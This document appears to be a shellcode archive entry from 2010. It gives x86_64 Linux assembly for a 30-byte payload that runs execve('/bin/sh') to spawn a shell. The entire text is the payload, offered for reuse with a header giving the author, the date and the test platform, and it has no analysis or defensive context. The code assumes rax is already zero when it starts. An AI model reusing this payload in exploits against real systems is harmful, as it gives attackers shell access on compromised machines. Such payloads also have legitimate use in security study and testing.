# Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode
# Date: 2010-04-26
# Author: zbt
# Tested on: x86_64 Debian GNU/Linux

# execve("/bin/sh", ["/bin/sh"], NULL)

.intel_syntax noprefix
.global _start
.section .text

_start:
    xor     rdx, rdx
    mov     qword rbx, 0x68732f6e69622f2f # '//bin/sh'
    shr     rbx, 0x8
    push    rbx
    mov     rdi, rsp
    push    rax
    push    rdi
    mov     rsi, rsp
    mov     al, 0x3b # syscall execve
    syscall
